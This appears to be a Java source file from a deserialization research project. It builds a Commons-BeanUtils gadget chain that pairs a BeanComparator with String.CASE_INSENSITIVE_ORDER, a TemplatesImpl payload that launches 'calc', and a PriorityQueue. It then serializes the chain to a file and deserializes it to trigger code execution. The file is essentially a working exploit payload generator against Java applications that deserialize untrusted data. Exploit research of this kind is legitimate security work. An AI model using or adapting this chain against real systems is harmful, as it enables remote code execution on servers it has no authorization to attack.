package Seri.CBGadgets;

import Seri.Utils;
import com.mchange.v2.codegen.bean.BeangenUtils;
import com.mchange.v2.codegen.intfc.DelegatorGenerator;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.NullComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import org.springframework.util.comparator.CompoundComparator;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

import static Seri.Utils.setValue;

public class CBCaseInsensitiveOrder {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Utils.createTemplatesImpl("calc");

//        BeanComparator beanComparator = new BeanComparator("class" , new NullComparator());
        BeanComparator beanComparator = new BeanComparator(null ,String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> priorityQueue = new PriorityQueue(2 ,beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("1");

        Utils.setValue(beanComparator ,"property" ,"outputProperties");
        Utils.setValue(priorityQueue ,"queue" ,new Object[]{templates ,templates});

        System.out.println(Utils.serialize(priorityQueue ,"bin/CBCaseInsensitiveOrder.bin"));
        Utils.unserialize("bin/CBCaseInsensitiveOrder.bin");

    }
}
